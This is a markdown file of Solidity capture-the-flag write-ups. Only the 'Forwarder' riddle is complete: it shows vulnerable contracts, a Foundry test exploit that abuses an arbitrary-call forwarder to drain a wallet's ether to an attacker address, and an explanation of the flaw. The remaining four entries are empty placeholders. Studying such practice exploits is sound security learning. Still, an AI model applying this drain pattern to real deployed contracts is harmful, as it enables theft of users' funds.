# CTF Write Ups 2

## RareSkills Solidity Riddles: Forwarder
Link: https://github.com/RareSkills/solidity-riddles/blob/main/contracts/Forwarder.sol

### Contracts
- `src/Week10-11/Forwarder.sol`
```
contract Wallet {
    address public immutable forwarder;

    constructor(address _forwarder) payable {
        require(msg.value == 1 ether);
        forwarder = _forwarder;
    }

    function sendEther(address destination, uint256 amount) public {
        require(msg.sender == forwarder, "sender must be forwarder contract");
        (bool success,) = destination.call{value: amount}("");
        require(success, "failed");
    }
}

contract Forwarder {
    function functionCall(address a, bytes calldata data) public {
        (bool success,) = a.call(data);
        require(success, "forward failed");
    }
}
```
- `test/Week10-11/Forwarder.t.sol`
```
contract ForwarderTest is Test {
    address attackerWallet;
    uint256 attackerWalletBalanceBefore;
    Forwarder forwarderContract;
    Wallet walletContract;

    function setUp() public {
        attackerWallet = address(0xdead);
        forwarderContract = new Forwarder();
        walletContract = (new Wallet){value: 1 ether}(address(forwarderContract));
        attackerWalletBalanceBefore = attackerWallet.balance;
    }

    function testExploit() public {
        bytes memory data = abi.encodeWithSignature("sendEther(address,uint256)", attackerWallet, 1 ether);
        forwarderContract.functionCall(address(walletContract), data);

        _checkSolved();
    }

    function _checkSolved() internal {
        uint256 attackerWalletBalanceAfter = attackerWallet.balance;
        assertApproxEqAbs(
            attackerWalletBalanceAfter - attackerWalletBalanceBefore,
            1 ether,
            1000000000000000 //delta = 0.001
        );
        uint256 walletContractBalance = address(walletContract).balance;
        assertEq(walletContractBalance, 0);
    }
}
```

### Exploit
Cracking this exploit requires knowing how `.call` and `abi.encodeWithSignature` works. But simply, `call` is a low level function used to interact with another contract; and `abi.encodeWithSignature` is used to encode function calls including the function signature and its arguments. The latter returns a bytes array representing an encoded function call that can be used to make a call to another contract's function with the encoded arguments.

Since `sendEther` in `Wallet` can only be called by the `Forwarder`, and `functionCall` in `Forwarder` takes in an arbitrary `data` input which is passed to `call`, we can easily get the `Wallet` contract to send its balance to the attackers wallet by passing in the following as `data``:
```
    bytes memory data = abi.encodeWithSignature("sendEther(address,uint256)", attackerWallet, 1 ether);
    forwarderContract.functionCall(address(walletContract), data);
```
The first line constructs the encoded `sendEther` function call with the attacker's wallet as the destination and 1 ether as the amount to send. When this is passed to `functionCall`, the `Forwarder` contract sends a call to `walletContract` to execute the encoded function call. Thus transfering out the balance to the attacker.

## RareSkills Solidity Riddles: Overmint3
Link: https://github.com/RareSkills/solidity-riddles/blob/main/contracts/Overmint3.sol

### Contracts
- `src/Week10-11/Overmint3.sol`
```
```
- `test/Week10-11/Overmint3.t.sol`
```
```

### Exploit

## RareSkills Solidity Riddles: Democracy
Link: https://github.com/RareSkills/solidity-riddles/blob/main/contracts/Democracy.sol

### Contracts
- `src/Week10-11/Democracy.sol`
```
```
- `test/Week10-11/Democracy.t.sol`
```
```

### Exploit

## Damn Vulnerable DeFi (Foundry): Truster
Link: https://github.com/tinchoabbate/damn-vulnerable-defi/tree/v3.0.0/contracts/truster

### Contracts
- `src/Week10-11/TrusterLenderPool.sol`
```
```
- `test/Week10-11/TrusterLenderPool.t.sol`
```
```

### Exploit

## Ethernaut: #13 Gatekeeper 1
Link: https://ethernaut.openzeppelin.com/level/0xb5858B8EDE0030e46C0Ac1aaAedea8Fb71EF423C

### Contracts
- `src/Week10-11/GateKeeperOne.sol`
```
```
- `test/Weel10-11/GateKeeperOne.t.sol`
```
```

### Exploit